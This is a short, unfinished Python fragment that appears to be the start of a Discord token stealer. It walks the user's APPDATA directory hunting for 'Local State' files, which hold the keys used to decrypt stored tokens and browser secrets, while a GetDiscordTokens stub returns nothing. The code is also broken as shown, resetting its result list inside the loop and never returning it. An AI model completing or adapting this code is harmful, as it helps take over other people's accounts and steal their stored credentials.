import re, os

from typing import List

def GetDiscordTokens() -> List[str]:
    paths = GetAppDataPaths()
    return []

def GetAppDataPaths() -> List[str]:
    for root, subdirs, files in os.walk(f"{os.getenv('APPDATA')}"):
        for file in files:
            path: str = os.path.join(root, file)
            datapaths: List[str] = []
            if "Local State" in path:
                datapaths.append(path.split(os.path.sep))